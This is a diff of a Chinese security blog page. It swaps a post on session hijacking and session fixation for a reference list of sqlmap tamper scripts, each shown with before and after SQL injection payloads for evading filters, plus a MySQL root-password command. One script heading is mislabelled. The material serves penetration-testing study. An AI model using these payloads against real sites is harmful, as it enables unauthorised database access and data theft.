@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="web漏洞,">
+  <meta name="keywords" content="杂,">
 
 
 
@@ -79,30 +79,18 @@
 
 
 
-<meta name="description" content="转：先知社区 前言在互联网中，对于用户来说不仅仅是单向信息传输，更重要的是信息交互，但是在web中，http协议是无状态的，当一个请求等到了服务器的回应之后，两者连接便中断了，而第二个请求发出后，服务端并不知道你和第一个请求的关系，所以没办法持续保持身份信息，每个http请求对于服务器来说，如果没有身份认证，那么对服务器来说所有人的请求都是一样无区别的。所以在互联网中，在所有需要信息双向交互的地方">
-<meta name="keywords" content="web漏洞">
+<meta name="description" content="自带tamper及用法apostrophemask.py适用数据库：ALL作用：将引号替换为utf-8，用于过滤单引号使用脚本前：tamper(&amp;quot;1 AND &amp;#39;1&amp;#39;=&amp;#39;1&amp;quot;)使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871 base64encode.py适用数据库：ALL作用：替换为base64编码使用脚本前：tamp">
+<meta name="keywords" content="杂">
 <meta property="og:type" content="article">
-<meta property="og:title" content="session，cookie认证会话安全问题">
-<meta property="og:url" content="http://yoursite.com/2019/02/28/身份认证劫持/index.html">
+<meta property="og:title" content="sqlmap及tamper用法">
+<meta property="og:url" content="http://yoursite.com/2019/09/19/sqlmap及tamper用法/index.html">
 <meta property="og:site_name" content="Sec-Communication">
-<meta property="og:description" content="转：先知社区 前言在互联网中，对于用户来说不仅仅是单向信息传输，更重要的是信息交互，但是在web中，http协议是无状态的，当一个请求等到了服务器的回应之后，两者连接便中断了，而第二个请求发出后，服务端并不知道你和第一个请求的关系，所以没办法持续保持身份信息，每个http请求对于服务器来说，如果没有身份认证，那么对服务器来说所有人的请求都是一样无区别的。所以在互联网中，在所有需要信息双向交互的地方">
+<meta property="og:description" content="自带tamper及用法apostrophemask.py适用数据库：ALL作用：将引号替换为utf-8，用于过滤单引号使用脚本前：tamper(&amp;quot;1 AND &amp;#39;1&amp;#39;=&amp;#39;1&amp;quot;)使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871 base64encode.py适用数据库：ALL作用：替换为base64编码使用脚本前：tamp">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153049-efec32cc-3bf3-1.png">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153050-f085de4a-3bf3-1.png">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153052-f14152ec-3bf3-1.png">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153053-f1c88cc6-3bf3-1.png">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153054-f26b7094-3bf3-1.png">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153055-f2ff294c-3bf3-1.png">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153056-f3be3c10-3bf3-1.png">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153057-f45090f6-3bf3-1.jpg">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153058-f52e33ca-3bf3-1.png">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153059-f5c40094-3bf3-1.png">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153100-f6790674-3bf3-1.png">
-<meta property="og:updated_time" content="2019-05-30T04:17:36.000Z">
+<meta property="og:updated_time" content="2019-09-19T11:17:09.208Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="session，cookie认证会话安全问题">
-<meta name="twitter:description" content="转：先知社区 前言在互联网中，对于用户来说不仅仅是单向信息传输，更重要的是信息交互，但是在web中，http协议是无状态的，当一个请求等到了服务器的回应之后，两者连接便中断了，而第二个请求发出后，服务端并不知道你和第一个请求的关系，所以没办法持续保持身份信息，每个http请求对于服务器来说，如果没有身份认证，那么对服务器来说所有人的请求都是一样无区别的。所以在互联网中，在所有需要信息双向交互的地方">
-<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190301153049-efec32cc-3bf3-1.png">
+<meta name="twitter:title" content="sqlmap及tamper用法">
+<meta name="twitter:description" content="自带tamper及用法apostrophemask.py适用数据库：ALL作用：将引号替换为utf-8，用于过滤单引号使用脚本前：tamper(&amp;quot;1 AND &amp;#39;1&amp;#39;=&amp;#39;1&amp;quot;)使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871 base64encode.py适用数据库：ALL作用：替换为base64编码使用脚本前：tamp">
 
 
 
@@ -132,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/02/28/身份认证劫持/">
+  <link rel="canonical" href="http://yoursite.com/2019/09/19/sqlmap及tamper用法/">
 
 
 
 
 
-  <title>session，cookie认证会话安全问题 | Sec-Communication</title>
+  <title>sqlmap及tamper用法 | Sec-Communication</title>
   
 
 
@@ -307,7 +295,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/28/身份认证劫持/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/19/sqlmap及tamper用法/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小猪佩奇">
@@ -324,7 +312,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">session，cookie认证会话安全问题</h1>
+          <h1 class="post-title" itemprop="name headline">sqlmap及tamper用法</h1>
         
 
         <div class="post-meta">
@@ -336,8 +324,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-28T00:00:00+08:00">
-                2019-02-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-19T00:00:00+08:00">
+                2019-09-19
               </time>
             
 
@@ -374,76 +362,45 @@
       
 
       
-        <p>转：先知社区</p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在互联网中，对于用户来说不仅仅是单向信息传输，更重要的是信息交互，但是在web中，http协议是无状态的，当一个请求等到了服务器的回应之后，两者连接便中断了，而第二个请求发出后，服务端并不知道你和第一个请求的关系，所以没办法持续保持身份信息，每个http请求对于服务器来说，如果没有身份认证，那么对服务器来说所有人的请求都是一样无区别的。所以在互联网中，在所有需要信息双向交互的地方就需要身份认证，对于不同的身份给予不同的权限，此时就用到会话这个概念。</p>
-<h1 id="为什么需要会话"><a href="#为什么需要会话" class="headerlink" title="为什么需要会话"></a>为什么需要会话</h1><p>首先要理解tcp的三次握手，一般在TCP三次握手就创建了一个会话，在会话中可以传递信息，等TCP关闭连接就关闭会话了。HTTP协议是基于TCP协议的，所以http会话也是在TCP关闭连接后就关闭会话，而在http1.1中，一般一个连接就只能处理一个请求，所以在需要权限身份认证的时候就需要有一种凭证，才能使得每次请求服务器都知道是你，相当于建立了连续的会话，也就是每次的请求都带有自己的身份凭证。</p>
-<p>简单点，会话就是让你在信息交互的时候让对方知道你是谁，并且一直知道你是谁，但是服务器不是人，没有自我辨别的功能，这时候需要一种凭证，也就是session。站在客户端角度，在你每次登录帐号密码之后，会有一串类似于短秘钥之类的东西，他只属于你，证明你的身份。站在服务器端，在php中，在你进行身份认证之后，会在服务器端保存一个以PHPSESSID为名的文件来储存你的身份，账号等各种信息，在用户每次提交带有session的请求时，自动去搜索这个以session命名的文件，查看里面的反序列化信息（也就是你的身份等信息）。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153049-efec32cc-3bf3-1.png" alt></p>
-<h1 id="php中的session"><a href="#php中的session" class="headerlink" title="php中的session"></a>php中的session</h1><p>在上面我们提到了php中的session，那么一旦phpsessid泄露，相当于别人也可以使用你的身份，而且一般session在浏览器关闭后也不会注销，仅仅是你已经丢失了你的sessionid，但是服务端并未立刻失效。<br>但是在php中并不是在登录之后才会给PHPSESSID，而是在</p>
-<pre><code>session_start();</code></pre><p>开始之后，http响应头部信息会返回 set-cookie:PHPSESSID=xxxxxxx,浏览器便会自动创建这个cookie，并且关联这个域名。同时，也在服务器端创建一个以Session ID命名的文件，此时你并没有登录，但是已经给了你相应的session，这时候带着账号密码去登录，登录成功后，Session ID才能匹配你的信息，否则不登录，在服务端创建的session文件内容为空，登录成功后，在服务端以你的phpsessid创建关于你信息的文件，当你带着这个phpsessid继续访问的时候，就会从服务端文件里查找关于你的信息，是否是管理员，还是普通用户，这属于后端代码编写不作讨论。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153050-f085de4a-3bf3-1.png" alt></p>
-<p>而在服务器端，会有一个sess_………………  命名的文件保存用户信息。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153052-f14152ec-3bf3-1.png" alt><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153053-f1c88cc6-3bf3-1.png" alt><br>这里后台代码仅仅简单写了一个用户权限功能，实际上会记录更全面的用户信息，而里面的信息全部被序列化存储。</p>
-<h1 id="session劫持"><a href="#session劫持" class="headerlink" title="session劫持"></a>session劫持</h1><p>要明白session劫持，首先需要清楚session id的存储位置，sessionid不仅仅存储在cookie中，也可能存储在post get（很少见），或者由url重写来完成，还有一部分存储在隐藏域中，一般首选是存储在cookie中，当禁用了cookie传递之后就会重写在url里，在url里传递很容易暴露造成更多的安全问题，在允许cookie传递的时候首选cookie，在php中提供了session.use_only_cookies选项，</p>
-<p>session劫持实际上就是自己的PHPSESSID被攻击者以某种方式获取，然后在会话的有效期内，利用被攻击者的身份登录网站，来达到身份劫持，伪装成合法用户。一般PHPSESSID存储在cookie中，XSS攻击也会造成session劫持。</p>
-<p>session成功劫持一般需要几个步骤，</p>
-<p>1.用户访问的平台是使用session来进行身份认证。<br>2.用户已经使用账号密码登录该平台，随即该用户会得到一个sessionid。<br>3.通过劫持获取到sessionid，并且在sessionid的有效期内使用（未注销前）。  </p>
-<p>那么如何获得sessionid是关键，接下来会谈到，一般可以使用</p>
-<p>1.劫持：XSS劫持，局域网嗅探，会话固定结合，任意文件读取漏洞等等。<br>2.爆破：直接通过大流量爆破出sessionid（一般是不太可能)。<br>3.得到session生成规则，并且得到签名通过计算获取。  </p>
-<h2 id="规则爆破"><a href="#规则爆破" class="headerlink" title="规则爆破"></a>规则爆破</h2><p>通过知道规则来进行爆破，不过这种方法基本上是没可能的局限性太多，且概率极小，php中的sessionid举例而言。生成规则如下。</p>
-<p>PHPSESSID生成<br>生成规则是根据hash_func散列来生成的，相关的参数有：   </p>
-<ul>
-<li>客户端IP   </li>
-<li>当前时间（秒）     </li>
-<li>当前时间（微秒）   </li>
-<li>PHP自带的随机数生产器  </li>
-</ul>
-<p>秒微秒可以爆破，随机数也可能是伪随机，客户端IP也可以某种手段获取，但是四种同时精准获取，难度极大，但是不排除有成功的可能性。根据生成规则，也有可能爆破出，但是相对来说几乎不太可能。</p>
-<h2 id="利用XSS或者文件读取"><a href="#利用XSS或者文件读取" class="headerlink" title="利用XSS或者文件读取"></a>利用XSS或者文件读取</h2><p>利用xss反弹到的cookie，来伪造身份登录。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153054-f26b7094-3bf3-1.png" alt><br>使用被攻击者的PHPSESSID，rv3kprfodknmqdrnf0cuial8r6</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153055-f2ff294c-3bf3-1.png" alt><br>即可利用管理员的session来登录，前提是必须在会话有效期内使用。</p>
-<p>或者利用任意文件读取，XXE等来进行读取文件名来获取sessionid，服务端保存的都是在有效期内的session。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153056-f3be3c10-3bf3-1.png" alt></p>
-<h2 id="会话固定劫持"><a href="#会话固定劫持" class="headerlink" title="会话固定劫持"></a>会话固定劫持</h2><p>会话固定也属于劫持的一种，或者说他是通过攻击者诱导使用固定的sessionid。会话固定的流程主要为</p>
-<p>1.攻击者通过构造url参数或者表单传递来固定sessionid。<br>2.诱使用户使用攻击者构造的参数来登陆。<br>3.在用户登录之后，攻击者直接使用自己之前构造的固定sessionid来登陆。  </p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153057-f45090f6-3bf3-1.jpg" alt></p>
-<p>会话固定漏洞并不常见，并且在早期通常是使用url来传递sessionid，这样更极大方便了攻击者，因为只要简单构造一条url，并且对于用户是很正常的url，例如，<a href="http://www.taobao.com?sessionid=test123，在用户使用这条url去登陆的时候就会固定了sessionid，就可能造成会话固定劫持漏洞。重置sessionid可由如下。" target="_blank" rel="noopener">www.taobao.com?sessionid=test123，在用户使用这条url去登陆的时候就会固定了sessionid，就可能造成会话固定劫持漏洞。重置sessionid可由如下。</a></p>
-<p>1.通过xss漏洞，可以通过js设置cookie中的sessionid。document.cookie=”sessionid=test123”<br>2.通过url传递，直接构造url–&gt;<a href="http://www.taobao.com?sessionid=test123" target="_blank" rel="noopener">www.taobao.com?sessionid=test123</a><br>3.使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部,通过自己的服务器页面绑定sessionid。</p>
-<p>接下来我们通过一个简单的php认证来做一次会话固定劫持，后端对身份验证代码如下。</p>
-<pre><code>&lt;?php session_start();?&gt;
-if($_POST[&apos;zhanghao&apos;] == $username &amp;&amp; $_POST[&apos;mima&apos;] == $password)
-    {
+        <h1 id="自带tamper及用法"><a href="#自带tamper及用法" class="headerlink" title="自带tamper及用法"></a>自带tamper及用法</h1><h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a><strong>apostrophemask.py</strong></h4><p>适用数据库：ALL<br>作用：将引号替换为utf-8，用于过滤单引号<br>使用脚本前：<code>tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)</code><br>使用脚本后：<code>1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</code></p>
+<h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a><strong>base64encode.py</strong></h4><p>适用数据库：ALL<br>作用：替换为base64编码<br>使用脚本前：<code>tamper(&quot;1&#39; AND SLEEP(5)#&quot;)</code><br>使用脚本后：<code>MScgQU5EIFNMRUVQKDUpIw==</code></p>
+<h4 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a><strong>multiplespaces.py</strong></h4><p>适用数据库：ALL<br>作用：围绕sql关键字添加多个空格<br>使用脚本前：<code>tamper(&#39;1 UNION SELECT foobar&#39;)</code><br>使用脚本后：<code>1 UNION SELECT foobar</code></p>
+<h4 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a><strong>space2plus.py</strong></h4><p>适用数据库：ALL<br>作用：用加号替换空格<br>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code><br>使用脚本后：<code>SELECT+id+FROM+users</code></p>
+<h4 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a><strong>nonrecursivereplacement.py</strong></h4><p>适用数据库：ALL<br>作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）<br>使用脚本前：<code>tamper(&#39;1 UNION SELECT 2--&#39;)</code><br>使用脚本后：<code>1 UNIOUNIONN SELESELECTCT 2--</code></p>
+<h4 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a><strong>space2randomblank.py</strong></h4><p>适用数据库：ALL<br>作用：将空格替换为其他有效字符<br>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code><br>使用脚本后：<code>SELECT%0Did%0DFROM%0Ausers</code></p>
+<h4 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a><strong>unionalltounion.py</strong></h4><p>适用数据库：ALL<br>作用：将<code>union allselect</code> 替换为<code>unionselect</code><br>使用脚本前：<code>tamper(&#39;-1 UNION ALL SELECT&#39;)</code><br>使用脚本后：<code>-1 UNION SELECT</code></p>
+<h4 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a><strong>securesphere.py</strong></h4><p>适用数据库：ALL<br>作用：追加特定的字符串<br>使用脚本前：<code>tamper(&#39;1 AND 1=1&#39;)</code><br>使用脚本后：<code>1 AND 1=1 and &#39;0having&#39;=&#39;0having&#39;</code></p>
+<h4 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a><strong>space2dash.py</strong></h4><p>适用数据库：ALL<br>作用：将空格替换为<code>--</code>，并添加一个随机字符串和换行符<br>使用脚本前：<code>tamper(&#39;1 AND 9227=9227&#39;)</code><br>使用脚本后：<code>1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227</code></p>
+<h4 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a><strong>space2mssqlblank.py</strong></h4><p>适用数据库：Microsoft SQL Server<br>测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005<br>作用：将空格随机替换为其他空格符号<code>(&#39;%01&#39;, &#39;%02&#39;, &#39;%03&#39;, &#39;%04&#39;, &#39;%05&#39;, &#39;%06&#39;, &#39;%07&#39;, &#39;%08&#39;, &#39;%09&#39;, &#39;%0B&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0E&#39;, &#39;%0F&#39;, &#39;%0A&#39;)</code><br>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code><br>使用脚本后：<code>SELECT%0Eid%0DFROM%07users</code></p>
+<h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a><strong>between.py</strong></h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：用<code>NOT BETWEEN 0 AND #</code>替换<code>&gt;</code><br>使用脚本前：<code>tamper(&#39;1 AND A &gt; B--&#39;)</code><br>使用脚本后：<code>1 AND A NOT BETWEEN 0 AND B--</code></p>
+<h4 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a><strong>percentage.py</strong></h4><p>适用数据库：ASP<br>测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br>作用：在每个字符前添加一个<code>%</code><br>使用脚本前：<code>tamper(&#39;SELECT FIELD FROM TABLE&#39;)</code><br>使用脚本后：<code>%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</code></p>
+<h4 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a><strong>sp_password.py</strong></h4><p>适用数据库：MSSQL<br>作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password<br>使用脚本前：<code>tamper(&#39;1 AND 9227=9227-- &#39;)</code><br>使用脚本后：<code>1 AND 9227=9227-- sp_password</code></p>
+<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a><strong>charencode.py</strong></h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）<br>使用脚本前：<code>tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)</code><br>使用脚本后：<code>%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</code></p>
+<h4 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a><strong>randomcase.py</strong></h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：随机大小写<br>使用脚本前：<code>tamper(&#39;INSERT&#39;)</code><br>使用脚本后：<code>INseRt</code></p>
+<h4 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a><strong>charunicodeencode.py</strong></h4><p>适用数据库：ASP、ASP.NET<br>测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3<br>作用：适用字符串的unicode编码<br>使用脚本前：<code>tamper(&#39;SELECT FIELD%20FROM TABLE&#39;)</code><br>使用脚本后：<code>%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</code></p>
+<h4 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a><strong>space2comment.py</strong></h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将空格替换为<code>/**/</code><br>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code><br>使用脚本后：<code>SELECT/**/id/**/FROM/**/users</code></p>
+<h4 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a><strong>equaltolike.py</strong></h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5<br>作用：将<code>=</code>替换为<code>LIKE</code><br>使用脚本前：<code>tamper(&#39;SELECT * FROM users WHERE id=1&#39;)</code><br>使用脚本后：<code>SELECT * FROM users WHERE id LIKE 1</code></p>
+<h4 id="equaltolike-py-1"><a href="#equaltolike-py-1" class="headerlink" title="equaltolike.py"></a><strong>equaltolike.py</strong></h4><p>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将<code>&gt;</code>替换为GREATEST，绕过对<code>&gt;</code>的过滤<br>使用脚本前：<code>tamper(&#39;1 AND A &gt; B&#39;)</code><br>使用脚本后：<code>1 AND GREATEST(A,B+1)=A</code></p>
+<h4 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a><strong>ifnull2ifisnull.py</strong></h4><p>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br>测试通过数据库：MySQL 5.0 and 5.5<br>作用：将类似于<code>IFNULL(A, B)</code>替换为<code>IF(ISNULL(A), B, A)</code>，绕过对<code>IFNULL</code>的过滤<br>使用脚本前：<code>tamper(&#39;IFNULL(1, 2)&#39;)</code><br>使用脚本后：<code>IF(ISNULL(1),2,1)</code></p>
+<h4 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a><strong>modsecurityversioned.py</strong></h4><p>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：过滤空格，使用mysql内联注释的方式进行注入<br>使用脚本前：<code>tamper(&#39;1 AND 2&gt;1--&#39;)</code><br>使用脚本后：<code>1 /*!30874AND 2&gt;1*/--</code></p>
+<h4 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a><strong>space2mysqlblank.py</strong></h4><p>适用数据库：MySQL<br>测试通过数据库：MySQL 5.1<br>作用：将空格替换为其他空格符号<code>(&#39;%09&#39;, &#39;%0A&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0B&#39;)</code><br>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code><br>使用脚本后：<code>SELECT%0Bid%0DFROM%0Cusers</code></p>
+<h4 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py"></a><strong>modsecurityzeroversioned.py</strong></h4><p>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：使用内联注释方式<code>（/*!00000*/）</code>进行注入<br>使用脚本前：<code>tamper(&#39;1 AND 2&gt;1--&#39;)</code><br>使用脚本后：<code>1 /*!00000AND 2&gt;1*/--</code></p>
+<h4 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a><strong>space2mysqldash.py</strong></h4><p>适用数据库：MySQL、MSSQL<br>作用：将空格替换为 <code>--</code> ，并追随一个换行符<br>使用脚本前：<code>tamper(&#39;1 AND 9227=9227&#39;)</code><br>使用脚本后：<code>1--%0AAND--%0A9227=9227</code></p>
+<h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a><strong>bluecoat.py</strong></h4><p>适用数据库：Blue Coat SGOS<br>测试通过数据库：MySQL 5.1,、SGOS<br>作用：在sql语句之后用有效的随机空白字符替换空格符，随后用<code>LIKE</code>替换<code>=</code><br>使用脚本前：<code>tamper(&#39;SELECT id FROM users where id = 1&#39;)</code><br>使用脚本后：<code>SELECT%09id FROM users where id LIKE 1</code></p>
+<h4 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a><strong>versionedkeywords.py</strong></h4><p>适用数据库：MySQL<br>测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11<br>作用：注释绕过<br>使用脚本前：<code>tamper(&#39;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#39;)</code><br>使用脚本后：<code>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</code></p>
+<h4 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a><strong>halfversionedmorekeywords.py</strong></h4><p>适用数据库：MySQL &lt; 5.1<br>测试通过数据库：MySQL 4.0.18/5.0.22<br>作用：在每个关键字前添加mysql版本注释<br>使用脚本前：<code>tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;=&#39;QDWa&quot;)</code><br>使用脚本后：<code>value&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#39;QDWa&#39;=&#39;QDWa</code></p>
+<h4 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a><strong>space2morehash.py</strong></h4><p>适用数据库：MySQL &gt;= 5.1.13<br>测试通过数据库：MySQL 5.1.41<br>作用：将空格替换为<code>#</code>，并添加一个随机字符串和换行符<br>使用脚本前：<code>tamper(&#39;1 AND 9227=9227&#39;)</code><br>使用脚本后：<code>1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</code></p>
+<h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a><strong>apostrophenullencode.py</strong></h4><p>适用数据库：ALL<br>作用：用非法双字节Unicode字符替换单引号<br>使用脚本前：<code>tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)</code><br>使用脚本后：<code>1 AND %00%271%00%27=%00%271</code></p>
+<h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a><strong>appendnullbyte.py</strong></h4><p>适用数据库：ALL<br>作用：在有效载荷的结束位置加载null字节字符编码<br>使用脚本前：<code>tamper(&#39;1 AND 1=1&#39;)</code><br>使用脚本后：<code>1 AND 1=1%00</code></p>
+<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a><strong>chardoubleencode.py</strong></h4><p>适用数据库：ALL<br>作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）<br>使用脚本前：<code>tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)</code><br>使用脚本后：<code>%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</code></p>
+<h4 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a><strong>unmagicquotes.py</strong></h4><p>适用数据库：ALL<br>作用：用一个多字节组合<code>%bf%27</code>和末尾通用注释一起替换空格<br>使用脚本前：<code>tamper(&quot;1&#39; AND 1=1&quot;)</code><br>使用脚本后：<code>1%bf%27 AND 1=1--</code></p>
+<h4 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a><strong>randomcomments.py</strong></h4><p>适用数据库：ALL<br>作用：用注释符分割sql关键字<br>使用脚本前：<code>tamper(&#39;INSERT&#39;)</code><br>使用脚本后：<code>I/**/N/**/SERT</code></p>
+<h1 id="编写tamper"><a href="#编写tamper" class="headerlink" title="编写tamper"></a>编写tamper</h1><p>额外记录mysql8.0.11修改root密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`ALTER` `user` `&apos;root&apos;``@``&apos;localhost&apos;` `IDENTIFIED ``BY` `&apos;Cliu123#&apos;`</span><br></pre></td></tr></table></figure>
 
-    $_SESSION[&quot;name&quot;]=$username;
-    }
-
-if ($_SESSION[&apos;name&apos;] == &quot;&quot;)
-{
-    echo &quot;&lt;script&gt;alert(&apos;对不起，你没有权限&apos;);location.href=&apos;index.php&apos;&lt;/script&gt;&quot;;
